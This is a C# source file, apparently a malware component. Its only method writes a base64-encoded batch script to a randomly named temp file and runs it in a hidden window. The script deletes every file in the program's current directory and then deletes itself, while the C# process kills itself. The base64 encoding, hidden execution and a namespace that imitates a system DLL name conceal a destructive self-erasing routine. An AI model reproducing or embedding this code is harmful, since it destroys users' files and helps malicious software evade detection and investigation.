using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Diagnostics;
using static System.Net.Mime.MediaTypeNames;

namespace user32
{
    public class jhkasd
    {
        public static void Remove()
        {
            string s = "QGVjaG8gb2ZmDQp0aW1lb3V0IDUgPiBOVUwNCmNkICUxDQpERUwgKiAvcQ0KKCBkZWwgL3EgL2YgIiV+ZjAiID5udWwgMj4mMSAmIGV4aXQgL2IgMCAgKQ==";
            string n = RandomString(10);
            string p = System.IO.Path.GetTempPath()+n+".bat";
            string arg = Directory.GetCurrentDirectory();
            File.WriteAllBytes(p, Convert.FromBase64String(s));
            Process proc = new Process();
            proc.StartInfo.FileName = p;
            proc.StartInfo.Arguments = arg;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();
            //System.Diagnostics.Process.Start(p, arg);
            Process.GetCurrentProcess().Kill();
        }

        private static Random random = new Random();

        private static string RandomString(int length)
        {
            string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            chars += chars.ToLower() + "0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}
